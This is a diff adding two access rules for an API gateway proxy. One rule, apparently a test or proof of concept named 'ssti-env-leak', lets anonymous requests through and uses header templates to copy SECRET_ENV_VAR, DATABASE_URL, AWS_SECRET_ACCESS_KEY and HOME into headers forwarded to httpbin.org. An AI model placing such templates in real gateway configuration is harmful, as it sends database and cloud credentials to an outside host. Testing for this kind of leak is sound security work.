@@ -1,0 +1,62 @@
+[
+  {
+    "id": "ssti-env-leak",
+    "upstream": {
+      "url": "https://httpbin.org/anything/ssti"
+    },
+    "match": {
+      "url": "http://<127.0.0.1|localhost>:4455/ssti/<.*>",
+      "methods": ["GET"]
+    },
+    "authenticators": [
+      {
+        "handler": "anonymous"
+      }
+    ],
+    "authorizer": {
+      "handler": "allow"
+    },
+    "mutators": [
+      {
+        "handler": "header",
+        "config": {
+          "headers": {
+            "X-User": "{{ print .Subject }}",
+            "X-Env-Leaked": "{{ env \"SECRET_ENV_VAR\" }}",
+            "X-DB-Leaked": "{{ env \"DATABASE_URL\" }}",
+            "X-AWS-Leaked": "{{ env \"AWS_SECRET_ACCESS_KEY\" }}",
+            "X-Home-Dir": "{{ env \"HOME\" }}"
+          }
+        }
+      }
+    ]
+  },
+  {
+    "id": "public-allow",
+    "upstream": {
+      "url": "https://httpbin.org/anything/public"
+    },
+    "match": {
+      "url": "http://<127.0.0.1|localhost>:4455/public/<.*>",
+      "methods": ["GET"]
+    },
+    "authenticators": [
+      {
+        "handler": "anonymous"
+      }
+    ],
+    "authorizer": {
+      "handler": "allow"
+    },
+    "mutators": [
+      {
+        "handler": "header",
+        "config": {
+          "headers": {
+            "X-User": "{{ print .Subject }}"
+          }
+        }
+      }
+    ]
+  }
+]
